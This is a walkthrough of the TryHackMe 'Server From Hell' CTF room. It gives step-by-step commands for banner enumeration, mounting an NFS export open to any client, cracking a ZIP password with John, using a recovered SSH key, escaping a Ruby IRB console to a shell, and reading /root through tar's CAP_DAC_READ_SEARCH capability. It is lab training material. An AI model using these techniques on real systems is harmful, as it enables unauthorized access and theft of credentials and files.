# The Server From Hell

Face a server that feels as if it was configured and deployed by Satan himself. Can you escalate to root?

Start at port 1337 and enumerate your way.
Good luck.

Room: https://tryhackme.com/room/theserverfromhell


⚠️ STOP

Stuck and need a nudge in the right direction?

➡️ Try the hints page before reading the full solution: https://github.com/garthheff/CTF-Hints/blob/main/theserverfromhell.md

---

# Hell — CTF Walkthrough

## Overview

This machine uses several chained enumeration techniques:

1. Banner grabbing across the first 100 TCP ports
2. NFS share enumeration
3. Cracking an encrypted ZIP archive
4. Identifying a real SSH service among Portspoof decoys
5. Escaping from a restricted Ruby IRB console
6. Abusing a Linux file capability to read the root flag

Set the target address first:

```bash
export TARGET=MACHINE_IP
```

---

## Initial Clue

Connecting to TCP port `1337` presented the first instruction:

```bash
nc "$TARGET" 1337
```

```text
Welcome traveller, to the beginning of your journey
To begin, find the trollface
Legend says he's hiding in the first 100 ports
Try printing the banners from the ports
```

The first 100 TCP ports therefore needed to be checked for banners.

---

## Banner Enumeration

An Nmap banner scan showed that nearly every port returned unusual data:

```bash
nmap -Pn -p1-100 --open -sV --script=banner "$TARGET"
```

Ports `1–50` collectively contained lines forming a trollface. More importantly, the banner on port `21` contained:

```text
go to port 12345
```

A cleaner way to print the banners in port order is:

```bash
for port in $(seq 1 50); do
    timeout 1 nc "$TARGET" "$port" 2>/dev/null |
        sed -E 's/^550 12345 //'
done
```

Connect to the discovered port:

```bash
nc "$TARGET" 12345
```

The next clue was:

```text
NFS shares are cool, especially when they are misconfigured
It's on the standard port, no need for another scan
```

---

## NFS Enumeration

NFS commonly uses port `2049`. List the available exports:

```bash
showmount -e "$TARGET"
```

```text
Export list for MACHINE_IP:
/home/nfs *
```

The wildcard means the export is available to any client.

Create a local mount point and mount the remote export:

```bash
mkdir -p /mnt/nfs
mount -t nfs "$TARGET":/home/nfs /mnt/nfs
```

The remote export path is `/home/nfs`; `/mnt/nfs` is only the local mount point.

Inspect the share:

```bash
ls -la /mnt/nfs
```

```text
-rw-r--r-- 1 root root 4534 Sep 15  2020 backup.zip
```

Copy the archive locally:

```bash
cp /mnt/nfs/backup.zip /root/backup.zip
```

---

## Cracking the ZIP Archive

Attempting to extract the archive showed that it was encrypted:

```bash
mkdir -p /root/backup
unzip /root/backup.zip -d /root/backup
```

```text
home/hades/.ssh/id_rsa password:
```

Convert the ZIP password into a format John can attack:

```bash
zip2john /root/backup.zip > /root/backup.hash
```

Crack it using RockYou:

```bash
john /root/backup.hash \
    --wordlist=/usr/share/wordlists/rockyou.txt
```

Display the recovered result:

```bash
john /root/backup.hash --show
```

To avoid recording the password directly in public notes, load it into a variable:

```bash
ZIP_PASSWORD=$(
    john /root/backup.hash --show |
    awk -F: '/backup.zip/{print $2}'
)
```

Extract the archive:

```bash
rm -rf /root/backup
mkdir -p /root/backup

unzip -P "$ZIP_PASSWORD" \
    /root/backup.zip \
    -d /root/backup
```

The archive contained the following SSH files:

```bash
cd /root/backup/home/hades/.ssh
ls -la
```

```text
authorized_keys
flag.txt
hint.txt
id_rsa
id_rsa.pub
```

Read the flag stored in the archive:

```bash
cat flag.txt
```

Read the next hint:

```bash
cat hint.txt
```

```text
2500-4500
```

This indicated that the SSH service was listening somewhere between ports `2500` and `4500`.

---

## Finding the Real SSH Service

Copy the recovered private key and apply the required permissions:

```bash
cp id_rsa /root/hades_id_rsa
chmod 600 /root/hades_id_rsa
```

Confirm that the key is valid and does not require a passphrase:

```bash
ssh-keygen -y -f /root/hades_id_rsa >/dev/null &&
    echo "Key is usable without a passphrase"
```

A normal Nmap version scan was extremely slow because the machine used Portspoof to return fake service banners from many ports.

Instead, perform a parallel banner check and look specifically for SSH greetings:

```bash
export TARGET

seq 2500 4500 |
xargs -P 100 -I{} sh -c '
    banner=$(
        timeout 1 nc "$TARGET" "{}" 2>/dev/null |
        head -n1
    )

    printf "%s" "$banner" |
    grep -qi "^SSH-" &&
        echo "SSH FOUND: port {} — $banner"
'
```

Many ports returned fake SSH banners. Port `3333` stood out because it returned a normal, standards-compliant OpenSSH banner:

```text
SSH-2.0-OpenSSH_7.6p1 Ubuntu-4ubuntu0.3
```

Connect as `hades`:

```bash
ssh -i /root/hades_id_rsa \
    -p 3333 \
    hades@"$TARGET"
```

---

## Escaping the Ruby Console

The SSH session did not initially provide a normal shell. Instead, it opened Ruby IRB:

```text
irb(main):001:0>
```

IRB allows Ruby code to be executed. Confirm operating-system command execution:

```ruby
system("id")
system("pwd")
system("ls -la")
```

Escape into Bash using Ruby's `exec` method:

```ruby
exec("/bin/bash")
```

This replaced the Ruby process with a normal Bash shell:

```text
hades@hell:~$
```

---

## User Flag

Read the user flag:

```bash
cat ~/user.txt
```

```text
thm{sh3ll_*****v3ry_1337}
```

---

## Privilege-Escalation Enumeration

Check the current identity:

```bash
id
```

```text
uid=1002(hades) gid=1002(hades) groups=1002(hades)
```

`sudo -l` required the unknown password, so other privilege-escalation paths were investigated.

Enumerate file capabilities:

```bash
getcap -r / 2>/dev/null
```

```text
/usr/bin/mtr-packet = cap_net_raw+ep
/bin/tar = cap_dac_read_search+ep
```

The important result was:

```text
/bin/tar = cap_dac_read_search+ep
```

`CAP_DAC_READ_SEARCH` allows the process to bypass normal discretionary access-control checks for:

* Reading files
* Traversing directories

This meant `/bin/tar` could read files under `/root`, even when `hades` could not access them normally.

---

## Reading the Root Flag with Tar

Move into a writable directory:

```bash
cd /tmp
```

Use the capable `tar` binary to archive `/root`:

```bash
/bin/tar -cf root-home.tar /root
```

The following warning is expected:

```text
/bin/tar: Removing leading `/' from member names
```

List the archive:

```bash
/bin/tar -tf root-home.tar
```

```text
root/
root/.gnupg/
root/.bashrc
root/root.txt
root/.bash_history
root/.ssh/
root/.ssh/authorized_keys
root/.profile
```

Read the root flag directly from the archive without extracting it:

```bash
/bin/tar -xOf root-home.tar root/root.txt
```

Alternatively, extract everything into a writable directory:

```bash
mkdir -p /tmp/root-loot
/bin/tar -xf root-home.tar -C /tmp/root-loot

cat /tmp/root-loot/root/root.txt
```

The root flag can now be submitted.

---

## Attack Chain

```text
Port 1337 clue
    ↓
Banner enumeration across ports 1–100
    ↓
Port 21 reveals port 12345
    ↓
NFS clue
    ↓
Mount exported /home/nfs share
    ↓
Recover encrypted backup.zip
    ↓
Crack ZIP password with John
    ↓
Extract Hades' SSH private key
    ↓
Hint identifies ports 2500–4500
    ↓
Find real SSH service on port 3333
    ↓
Log in as hades
    ↓
Escape Ruby IRB with exec("/bin/bash")
    ↓
Discover CAP_DAC_READ_SEARCH on /bin/tar
    ↓
Archive and read /root/root.txt
```

---

## Key Lessons

* Service banners can contain information distributed across multiple ports.
* An NFS export using `*` may expose sensitive files to any client.
* Backup archives frequently contain credentials and private SSH keys.
* Portspoof can make normal service-version detection extremely slow and noisy.
* A valid SSH banner can help distinguish a real service from decoys.
* Language consoles such as Ruby IRB may allow direct process execution.
* Linux capabilities can provide highly privileged access without setting the SUID bit.
* `CAP_DAC_READ_SEARCH` effectively grants a binary unrestricted file-reading access.
